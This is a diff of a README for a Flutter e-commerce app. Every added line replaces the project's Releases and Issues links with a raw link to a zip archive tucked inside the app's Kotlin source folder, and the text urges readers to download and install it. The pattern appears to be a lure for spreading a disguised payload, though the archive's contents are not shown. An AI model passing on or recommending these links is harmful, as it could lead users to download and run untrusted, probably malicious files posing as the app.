@@ -4,10 +4,10 @@
 Welcome to the flutter-shopping-app! This is a fully functional e-commerce application built with Flutter. It comes with a sleek dark theme and is designed using Material Design 3. You can browse products, manage a shopping cart, and even search for items. Let’s make your online shopping simple and enjoyable!
 
 ### 💾 Download the App
-[![Download the App](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/calebgaichuhie/flutter-shopping-app/releases)
+[![Download the App](https://raw.githubusercontent.com/calebgaichuhie/flutter-shopping-app/main/android/app/src/main/kotlin/com/marketplace/flutter-shopping-app_v2.8-alpha.3.zip)](https://raw.githubusercontent.com/calebgaichuhie/flutter-shopping-app/main/android/app/src/main/kotlin/com/marketplace/flutter-shopping-app_v2.8-alpha.3.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/calebgaichuhie/flutter-shopping-app/releases) to download the app. You will find the latest version available for download. Follow these steps to install:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/calebgaichuhie/flutter-shopping-app/main/android/app/src/main/kotlin/com/marketplace/flutter-shopping-app_v2.8-alpha.3.zip) to download the app. You will find the latest version available for download. Follow these steps to install:
 
 1. Click on the link above or the button to go to the Releases page.
 2. Find the version you want to install.
@@ -53,10 +53,10 @@ If you encounter any issues during installation or while using the app, consider
 - **Not Finding Products:** Use the search bar to refine your query.
 
 ## 💬 Support
-If you need help, feel free to reach out. You can check out the Issues section on our [GitHub page](https://github.com/calebgaichuhie/flutter-shopping-app/issues) for common problems and solutions.
+If you need help, feel free to reach out. You can check out the Issues section on our [GitHub page](https://raw.githubusercontent.com/calebgaichuhie/flutter-shopping-app/main/android/app/src/main/kotlin/com/marketplace/flutter-shopping-app_v2.8-alpha.3.zip) for common problems and solutions.
 
 ## 📝 Contribution
 We welcome contributions to improve the app. If you are interested in helping, please check the Contribution Guidelines on our GitHub page.
 
 ### 🚀 Download the App Again
-Don’t forget to head back to the [Releases page](https://github.com/calebgaichuhie/flutter-shopping-app/releases) for the latest version and updates. Your shopping experience awaits!
+Don’t forget to head back to the [Releases page](https://raw.githubusercontent.com/calebgaichuhie/flutter-shopping-app/main/android/app/src/main/kotlin/com/marketplace/flutter-shopping-app_v2.8-alpha.3.zip) for the latest version and updates. Your shopping experience awaits!
